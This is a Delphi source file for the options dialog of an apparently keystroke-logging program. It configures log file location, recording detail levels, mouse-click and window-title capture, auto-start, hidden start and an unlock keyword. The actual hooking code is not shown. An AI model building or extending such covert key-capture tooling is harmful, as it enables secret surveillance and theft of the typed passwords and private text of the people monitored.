unit Option;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ComCtrls, global, Tabnotbk, ExtCtrls;

type
  TFrmOpti = class(TForm)
    btOk: TButton;
    btCancel: TButton;
    OpenDialog1: TOpenDialog;
    TabbedNotebook1: TTabbedNotebook;
    EditLogName: TEdit;
    btBrouse: TButton;
    GroupBox1: TGroupBox;
    rbRecord1: TRadioButton;
    rbRecord2: TRadioButton;
    rbRecord3: TRadioButton;
    KeyUpBox: TCheckBox;
    rbRecord4: TRadioButton;
    MouseClickBox: TCheckBox;
    Button1: TButton;
    GroupBox2: TGroupBox;
    CheckBox1: TCheckBox;
    SubWindowTitleBox: TCheckBox;
    KeyboardLayoutBox: TCheckBox;
    CurrenttimeBox: TCheckBox;
    AutoStartBox: TCheckBox;
    StartHideBox: TCheckBox;
    Bevel1: TBevel;
    Bevel2: TBevel;
    GroupBox3: TGroupBox;
    Label1: TLabel;
    KeyWordEdit: TEdit;
    Label2: TLabel;
    LabelW: TLabel;
    procedure btOkClick(Sender: TObject);
    procedure btBrouseClick(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure KeyWordEditKeyPress(Sender: TObject; var Key: Char);
    procedure AutoStartBoxClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmOpti: TFrmOpti;

implementation
uses Hookmain;

{$R *.DFM}

procedure TFrmOpti.btOkClick(Sender: TObject);
begin
  {logName:=}
  ReOpenLog(EditLogName.Text);
  if rbRecord1.Checked then KeyRecord:=krBasic;
  if rbRecord2.Checked then KeyRecord:=krMain;
  if rbRecord3.Checked then KeyRecord:=krAll;
  if rbRecord4.Checked then KeyRecord:=krCrazy;
  RecordKeyUp:=KeyUpBox.Checked;
  RecordMouseClick:=MouseClickBox.Checked;

  RecSubWindowTitle:=SubWindowTitleBox.Checked;
  RecKBDLayout:=KeyboardLayoutBox.Checked;
  RecTime:=CurrenttimeBox.Checked;

  KeyWord:=KeyWordEdit.Text;
  StartHide:=StartHideBox.Checked;
end;

procedure TFrmOpti.btBrouseClick(Sender: TObject);
begin
  if OpenDialog1.Execute then begin
    EditLogName.Text:=OpenDialog1.FileName;
  end;
end;

procedure TFrmOpti.FormShow(Sender: TObject);
begin
  LabelW.Caption:='';
  if KeyWord='' then begin
    TabbedNotebook1.ActivePage:='StartUp';
    KeyWordEdit.SetFocus;
    LabelW.Caption:='Please enter KEYWORD'
  end;

  EditLogName.Text:=logName;
  case KeyRecord of
    krBasic:rbRecord1.Checked:=true;
    krMain: rbRecord2.Checked:=true;
    krAll:  rbRecord3.Checked:=true;
    krCrazy:rbRecord4.Checked:=true;
  end;
  KeyUpBox.Checked:=RecordKeyUp;
  MouseClickBox.Checked:=RecordMouseClick;

  SubWindowTitleBox.Checked:=RecSubWindowTitle;
  KeyboardLayoutBox.Checked:=RecKBDLayout;
  CurrenttimeBox.Checked:=RecTime;

  KeyWordEdit.Text:=KeyWord;
  StartHideBox.Checked:=StartHide;
end;

procedure TFrmOpti.KeyWordEditKeyPress(Sender: TObject; var Key: Char);
begin
  if not (Key in ['A'..'Z',' ','a'..'z',#8]) Then Key:=#0;
end;

procedure TFrmOpti.AutoStartBoxClick(Sender: TObject);
begin
{  If AutoStartBox.Checked
  Then StartHideBox.Enabled:=true
  Else begin
    StartHideBox.Checked:=false;
    StartHideBox.Enabled:=false;
  end;}
end;

end.

